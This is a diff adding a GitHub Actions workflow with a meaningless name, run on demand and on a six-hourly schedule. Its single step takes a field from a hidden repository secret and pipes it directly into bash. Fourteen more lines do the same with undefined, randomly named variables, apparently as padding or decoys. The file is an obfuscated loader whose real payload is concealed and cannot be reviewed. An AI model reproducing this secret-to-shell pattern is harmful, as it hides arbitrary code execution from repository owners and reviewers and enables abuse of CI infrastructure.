@@ -1,0 +1,32 @@
+name: zheyangzhendebumiaoo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zheyangzhendebumiaoo
+        env:
+          vgx4: ${{ secrets.vgx4 }}
+        run: |
+          echo $vgx4 | jq -r .llke66 | /bin/bash
+          echo $lsy3205 | jq -r .dqzt9599 | /bin/bash
+          echo $gowiw4734 | jq -r .l847 | /bin/bash
+          echo $arpxk1 | jq -r .ivls01582 | /bin/bash
+          echo $uw1 | jq -r .tdhw79 | /bin/bash
+          echo $rke5 | jq -r .kn0988 | /bin/bash
+          echo $hf043 | jq -r .qto95652 | /bin/bash
+          echo $azxs0430 | jq -r .m71 | /bin/bash
+          echo $lceik69686 | jq -r .vj09065 | /bin/bash
+          echo $mco8 | jq -r .qvbq018 | /bin/bash
+          echo $ctv4696 | jq -r .bwtom417 | /bin/bash
+          echo $eq51 | jq -r .esjnx172 | /bin/bash
+          echo $hc8996 | jq -r .aer56974 | /bin/bash
+          echo $jhv5 | jq -r .uga3 | /bin/bash
+          echo $u455 | jq -r .hip4 | /bin/bash
+
